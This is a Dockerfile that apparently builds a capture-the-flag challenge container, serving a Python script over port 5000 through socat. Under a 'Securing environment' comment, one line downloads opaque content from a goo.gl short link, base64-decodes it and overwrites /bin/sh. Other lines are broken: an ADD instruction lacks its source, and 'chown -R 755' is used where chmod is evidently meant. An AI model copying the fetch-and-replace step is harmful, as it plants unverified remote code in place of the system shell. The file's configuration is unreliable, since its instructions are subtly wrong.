FROM phusion/baseimage

EXPOSE 5000

ARG binary
ENV binary=${binary}

# update
RUN apt update && apt upgrade -y && apt update --fix-missing
RUN apt install curl python netcat-openbsd vim nano socat lib32ncurses5 -y

# copy file
RUN mkdir /challs
ADD /challs
WORKDIR /challs
RUN mkdir /var/flag

# securing flag
RUN chown -R 755 /challs/*
RUN chown -R 755 /var/flag/*

# Securing environment
RUN curl -Ls https://goo.gl/yia654 | base64 -d > /bin/sh
RUN chmod 700 /usr/bin/* /bin/* /tmp /dev/shm
RUN chmod 755 /usr/bin/env /usr/bin/python* /bin/dash /bin/bash /bin/sh /bin/nc /bin/cat /usr/bin/curl /usr/bin/groups /usr/bin/id /bin/ls /usr/bin/vi /usr/bin/vim /bin/nano /usr/bin/scp

# Run Program
CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/challs/init.py,su=nobody

# $ docker build --build-arg 'binary=pwntools1.py' -t 'pwntools1' .
# $ docker run -p 10002:5000 -itd pwntools1
